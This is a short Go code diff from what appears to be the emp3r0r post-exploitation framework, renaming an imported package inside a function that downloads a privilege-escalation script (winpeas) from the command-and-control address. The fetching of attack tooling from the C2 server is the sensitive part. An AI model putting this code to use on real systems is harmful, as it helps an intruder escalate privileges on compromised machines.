@@ -8,7 +8,7 @@ import (
 	"log"
 	"strings"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 )
 
 func runLPEHelper(method, checksum string) (out string) {
@@ -16,7 +16,7 @@ func runLPEHelper(method, checksum string) (out string) {
 		return "Only lpe_winpeas* is supported for now"
 	}
 
-	log.Printf("Downloading LPE script from %s", emp3r0r_data.CCAddress+method)
+	log.Printf("Downloading LPE script from %s", emp3r0r_def.CCAddress+method)
 	var scriptData []byte
 	scriptData, err := SmartDownload("", method, "", checksum)
 	if err != nil {
